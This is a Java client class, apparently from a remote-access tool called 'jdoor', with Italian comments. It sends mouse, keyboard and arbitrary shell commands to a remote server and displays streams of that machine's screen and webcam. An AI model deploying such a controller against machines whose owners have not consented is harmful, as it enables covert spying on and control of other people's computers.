package com.jdoor.client;

import com.jdoor.Constants;
import com.jdoor.client.view.ClientFrame;
import com.jdoor.client.view.StreamView;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;

import java.util.Arrays;
import java.util.Base64;

import static com.jdoor.Constants.*;


/**
 * Thread che permette di mandare comandi al server.
 */
public class ClientCommander extends Thread {
    private Socket socketCommands;

    private final BufferedWriter commandsWriter;
    private final BufferedReader resultReader;
    private final ClientFrame cFrame;

    private ClientScreenView screenView;
    private ClientWebcamView webcamView;

    /**
     * Costruttore del thread.
     * @param ipAddress IP del server.
     * @param portTCP Porta TCP del server.
     * @param portUDP Posta UDP del server.
     * @param cFrame Frame dello schermo del client.
     * @throws IOException Nel caso non si riuscisse ad aprire i canali di comunicazione fa client e server.
     */
    public ClientCommander(String ipAddress, ClientFrame cFrame) throws IOException {
        socketCommands = new Socket(InetAddress.getByName(ipAddress), TCP_PORT);

        commandsWriter = new BufferedWriter(new OutputStreamWriter(socketCommands.getOutputStream()));
        resultReader = new BufferedReader(new InputStreamReader(socketCommands.getInputStream()));


        screenView = new ClientScreenView(UDP_SCREEN_PORT, this);
        webcamView = new ClientWebcamView(UDP_WEBCAM_PORT, this);

        this.cFrame = cFrame;
    }

    /**
     * Metodo per chiudere la connessione col client.
     * @throws IOException Nel caso ci sia un errore nella chiusura della connessione.
     */
    public void closeConnection() throws IOException {
        sendCloseMessage();
        commandsWriter.close();
        resultReader.close();
        socketCommands.close();
        socketCommands = null;
    }

    /**
     * Metodo per mandare la posizione del mouse.
     * @param mouseX La posizione X del mouse.
     * @param mouseY La posizione Y del mouse.
     * @param button Il bottone (destro o sinistro) che è stato mandato dal mouse.
     * @throws IOException Nel caso non si riesca a mandare la posizione.
     */
    public void sendMousePosition(int mouseX, int mouseY, char button) throws IOException {
        // Ottenere le posizioni del mouse in base a dove dovrebbe essere nel server.
        float scaledMouseXf = (float) screenView.getScreenWidth() / ((float) cFrame.getScreenPanel().getWidth() / mouseX);
        float scaledMouseYf = (float) screenView.getScreenHeight() / ((float) cFrame.getScreenPanel().getHeight()/mouseY);
        // Convertirle a intero per eccesso.
        int scaledMouseX = Math.round(scaledMouseXf);
        int scaledMouseY = Math.round(scaledMouseYf);
        // Creare il comando e mandare la posizione.
        String command = "M" + button + scaledMouseX + ";" + scaledMouseY + "\n";

        System.out.println(command);
        commandsWriter.write(command);
        commandsWriter.flush();
    }

    /**
     * Metodo per mandare il messaggio di disconnessione.
     * @throws IOException Nel caso non si riesca a mandare il messaggio.
     */
    public void sendCloseMessage() throws IOException {
        commandsWriter.write("S\n");
        commandsWriter.flush();
    }

    /**
     * Questo metodo viene usato solo per la disconnessione automatica
     * nel caso non si riceva lo schermo dal server per più di 30 secondi.
     */
    public void doCloseFromFrame() {
        if(cFrame.getDisconnectBtn().isEnabled()) {
            cFrame.getDisconnectBtn().doClick();
        }
    }

    /**
     * Metodo per mandare un tasto al server.
     * @param keyCode Il codice del tasto da mandare.
     * @throws IOException Se non si riesce a mandare il codice del tasto.
     */
    public void sendKey(int keyCode) throws IOException {
        commandsWriter.write("K" + keyCode + "\n");
        commandsWriter.flush();
    }

    /**
     * Metodo per mandare un comando da eseguire a shell.
     * @param command Il comando da eseguire.
     * @throws IOException Nel caso non si riesca a mandare il comando.
     */
    public void sendCommands(String command) throws IOException {
        if(command.equals("WO") || command.equals("WC")) {
            commandsWriter.write(command + "\n");
        } else {
            commandsWriter.write("C" + command + "\n");
        }
        commandsWriter.flush();
    }

    /**
     * Metodo per mandare il comando per interrompere o riprendere
     * lo stream dello schermo.
     * @throws IOException Nel caso non si riesca a mandare il messaggio.
     */
    public void sendScreenStopStart() throws IOException {
        if(screenView.isWatching()) {
            screenView.setWatching(false);
        } else {
            screenView.setWatching(true);
        }
        commandsWriter.write("L\n");
        commandsWriter.flush();
    }

    /**
     * Metodo per mandare la richiesta delle informazioni sullo schermo del server.
     * @throws IOException Nel caso non si riesca a mandare il messaggio.
     */
    public void sendScreenRequest() throws IOException {
        commandsWriter.write("R\n");
        commandsWriter.flush();
    }

    public Socket getSocketCommands() {
        return socketCommands;
    }

    /**
     * Metodo principale del thread.
     */
    @Override
    public void run() {
        String response = "";
        while(socketCommands != null) {
            try {
                if (screenView.getScreenHeight() == 0 && screenView.getScreenWidth() == 0) {
                    sendScreenRequest();
                    screenView.setScreenView((StreamView) cFrame.getScreenPanel());
                    webcamView.setScreenView((StreamView) cFrame.getWebcamPanel());
                    screenView.setScreenDimension(resultReader.readLine());
                    screenView.setWatching(true);
                    screenView.start();
                    webcamView.start();
                } else {
                    String data = new String(Base64.getDecoder().decode(resultReader.readLine()));
                    cFrame.getOutputArea().setText(data + "\n");
                }
            }catch (IOException e) {
                cFrame.getOutputArea().setText(e.getMessage());
                socketCommands = null;
                doCloseFromFrame();
            }
        }
    }
}
